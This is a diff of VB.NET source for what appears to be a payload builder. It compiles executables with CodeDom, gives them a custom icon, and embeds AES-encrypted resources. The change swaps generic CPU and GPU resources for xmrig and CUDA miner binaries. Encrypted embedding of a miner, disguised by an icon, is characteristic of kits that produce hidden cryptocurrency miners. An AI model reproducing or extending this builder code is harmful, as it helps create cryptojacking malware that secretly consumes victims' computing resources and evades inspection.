@@ -14,7 +14,7 @@ Public Class Codedom
 
         If ICOPath IsNot Nothing Then
             IO.File.Copy(ICOPath, Environment.GetFolderPath(35) + "\icon.ico", True) 'codedom cant read spaces
-            F.txtLog.Text = F.txtLog.Text.Insert(0, "Adding Icon..." + vbNewLine)
+            F.txtLog.Text = F.txtLog.Text + ("Adding Icon..." + vbNewLine)
             OP += " /win32icon:" + Environment.GetFolderPath(35) + "\icon.ico"
         End If
 
@@ -28,17 +28,18 @@ Public Class Codedom
             .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
 
-            F.txtLog.Text = F.txtLog.Text.Insert(0, "Creating a DLL..." + vbNewLine)
+            F.txtLog.Text = F.txtLog.Text + ("Creating a DLL..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                 R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
-                R.AddResource(F.Resources_cpu, AES_Encryptor(My.Resources.cpu))
-                R.AddResource(F.Resources_nvidia, AES_Encryptor(My.Resources.nvidia))
-                R.AddResource(F.Resources_amd, AES_Encryptor(My.Resources.amd))
+                R.AddResource(F.Resources_xmr, AES_Encryptor(My.Resources.xmrig))
+                R.AddResource(F.Resources_cuda1, AES_Encryptor(My.Resources.xmrig_cuda))
+                R.AddResource(F.Resources_cuda2, AES_Encryptor(My.Resources.nvrtc64_101_0))
+                R.AddResource(F.Resources_cuda3, AES_Encryptor(My.Resources.nvrtc_builtins64_101))
                 R.Generate()
             End Using
 
-            F.txtLog.Text = F.txtLog.Text.Insert(0, "Embedded Resource..." + vbNewLine)
+            F.txtLog.Text = F.txtLog.Text + ("Embedded Resource..." + vbNewLine)
             .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + F.Resources_Parent + ".Resources")
 
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
